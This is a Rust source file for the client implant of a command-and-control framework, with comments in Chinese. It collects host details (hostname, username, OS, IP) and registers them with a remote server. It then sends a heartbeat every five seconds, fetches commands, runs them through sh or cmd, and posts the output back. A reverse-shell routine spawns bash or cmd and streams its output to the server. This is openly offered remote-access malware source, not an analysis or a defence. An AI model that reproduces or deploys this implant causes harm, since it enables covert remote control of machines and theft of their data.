use reqwest::Client;
use serde_json;
use std::io::{BufRead, BufReader}; // Removed Write
use std::process::{Command, Stdio};
use std::time::Duration;
use tokio::time::sleep;
use uuid::Uuid;

// 引入common模块
use rust_c2_framework::common::*;

/// C2客户端
pub struct C2Client {
    client_id: String,
    server_url: String,
    client: Client,
    client_info: ClientInfo,
}

impl C2Client {
    pub fn new(server_url: String) -> Result<Self, Box<dyn std::error::Error>> {
        let client_id = Uuid::new_v4().to_string();
        let client = Client::new();

        let hostname = network::get_hostname().unwrap_or_else(|_| "unknown".to_string());

        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os = std::env::consts::OS.to_string();
        let arch = std::env::consts::ARCH.to_string();

        let ip = network::get_local_ip()
            .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
            .to_string();

        let client_info = ClientInfo {
            id: client_id.clone(),
            hostname,
            username,
            os,
            arch,
            ip,
            connected_at: chrono::Utc::now(),
            last_seen: chrono::Utc::now(),
        };

        Ok(Self {
            client_id,
            server_url,
            client,
            client_info,
        })
    }

    /// 注册客户端到服务器
    pub async fn register(&self) -> Result<(), Box<dyn std::error::Error>> {
        let payload = serde_json::to_vec(&self.client_info)?;
        let message = Message::new(MessageType::ClientRegister, payload);

        let response = self
            .client
            .post(&format!("{}/api/register", self.server_url))
            .json(&message)
            .send()
            .await?;

        if response.status().is_success() {
            println!("Client registered successfully");
        } else {
            println!("Failed to register client: {}", response.status());
        }

        Ok(())
    }

    /// 发送心跳
    pub async fn send_heartbeat(&self) -> Result<(), Box<dyn std::error::Error>> {
        let payload = serde_json::to_vec(&self.client_info)?;
        let message = Message::new(MessageType::Heartbeat, payload);

        let response = self
            .client
            .post(&format!("{}/api/heartbeat", self.server_url))
            .json(&message)
            .send()
            .await?;

        if !response.status().is_success() {
            println!("Failed to send heartbeat: {}", response.status());
        }

        Ok(())
    }

    /// 获取并执行命令
    pub async fn check_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
        let response = self
            .client
            .get(&format!(
                "{}/api/commands/{}",
                self.server_url, self.client_id
            ))
            .send()
            .await?;

        if response.status().is_success() {
            let commands: Vec<CommandRequest> = response.json().await?;

            for cmd in commands {
                self.execute_command(&cmd).await?;
            }
        }

        Ok(())
    }

    /// 执行命令
    pub async fn execute_command(
        &self,
        cmd: &CommandRequest,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &cmd.command])
                .args(&cmd.args)
                .output()
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&format!("{} {}", cmd.command, cmd.args.join(" ")))
                .output()
        };

        let result = match output {
            Ok(output) => CommandResponse {
                client_id: self.client_id.clone(),
                command: cmd.command.clone(),
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                exit_code: output.status.code().unwrap_or(-1),
                executed_at: chrono::Utc::now(),
            },
            Err(e) => CommandResponse {
                client_id: self.client_id.clone(),
                command: cmd.command.clone(),
                stdout: String::new(),
                stderr: format!("Failed to execute command: {}", e),
                exit_code: -1,
                executed_at: chrono::Utc::now(),
            },
        };

        // 发送结果回服务器
        let payload = serde_json::to_vec(&result)?;
        let message = Message::new(MessageType::CommandResult, payload);

        self.client
            .post(&format!("{}/api/command_result", self.server_url))
            .json(&message)
            .send()
            .await?;

        Ok(())
    }

    /// 启动反弹Shell
    pub async fn start_reverse_shell(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("Starting reverse shell...");

        // 创建shell进程
        let mut child = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?
        } else {
            Command::new("/bin/bash")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?
        };

        let _stdin = child.stdin.take().unwrap(); // Fix: unused variable
        let stdout = child.stdout.take().unwrap();
        let _stderr = child.stderr.take().unwrap(); // Fix: unused variable

        // 启动输出读取任务
        let _client_id = self.client_id.clone(); // Fix: unused variable
        let server_url = self.server_url.clone();
        let client = self.client.clone();

        tokio::spawn(async move {
            let mut reader = BufReader::new(stdout);
            let mut line = String::new();

            while let Ok(bytes_read) = reader.read_line(&mut line) {
                if bytes_read == 0 {
                    break;
                }

                let payload = line.as_bytes().to_vec();
                let message = Message::new(MessageType::ShellData, payload);

                if let Err(e) = client
                    .post(&format!("{}/api/shell_data", server_url))
                    .json(&message)
                    .send()
                    .await
                {
                    eprintln!("Failed to send shell data: {}", e);
                }

                line.clear();
            }
        });

        // 等待进程结束
        let _ = child.wait();

        Ok(())
    }

    /// 主循环
    pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        // 注册客户端
        self.register().await?;

        println!("C2 Client started with ID: {}", self.client_id);

        loop {
            // 发送心跳
            if let Err(e) = self.send_heartbeat().await {
                eprintln!("Failed to send heartbeat: {}", e);
            }

            // 检查命令
            if let Err(e) = self.check_commands().await {
                eprintln!("Failed to check commands: {}", e);
            }

            // 等待一段时间
            sleep(Duration::from_secs(5)).await;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let server_url = args
        .get(1)
        .map(|s| s.to_string())
        .unwrap_or_else(|| "http://127.0.0.1:8080".to_string());

    let client = C2Client::new(server_url)?;
    client.run().await?;

    Ok(())
}
